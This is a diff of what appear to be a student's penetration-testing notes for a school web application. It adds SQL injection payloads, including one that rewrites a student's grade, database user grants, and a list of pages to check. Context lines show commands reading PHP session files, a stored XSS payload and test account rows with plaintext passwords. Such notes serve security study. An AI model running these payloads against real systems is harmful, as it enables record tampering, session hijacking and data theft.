@@ -1,3 +1,20 @@
+
+' OR '1' = '1' LIMIT 1  --
+' OR 1=1; --
+
+'; UPDATE `Cours_info` SET `note` = 19 WHERE `stu_id`=1; --
+
+
+CREATE USER 'user1'@'%' IDENTIFIED BY 'user1';
+
+
+GRANT SELECT, INSERT, UPDATE, DELETE ON `insa_db`.`Posts` TO 'user1'@'%';
+GRANT SELECT, INSERT, UPDATE, DELETE ON `insa_db`.`Cours_info` TO 'user1'@'%';
+GRANT SELECT, INSERT, UPDATE, DELETE ON `insa_db`.`Users` TO 'user1'@'%';
+
+
+FLUSH PRIVILEGES;
+
 ls -l /var/lib/php/sessions
 
 cat /var/lib/php/sessions/sess_
@@ -28,3 +45,12 @@ admin@insa-cvl.fr 	abcdefg 	Admin 	User 	M 	1985-09-30 	789 Oak St 	5678901234 	
 1 	1 	<script>document.write('<img src="http://127.0.0.1... 	1 	M 	2024-12-10 	1 	1 	1_1.jpg 	Student
 tom@gmail.com 	1234 	CONSTANS 	Mathis 	M 	2003-11-27 	123 rue Exemple 	0606060706 	CONSTANS_mathis.jpg 	Student
 9 	2 	2 	2
+
+
+
+check_contact_search
+check_forum_search
+check_cours_comment
+check_cours
+check_receive_mail
+check_note
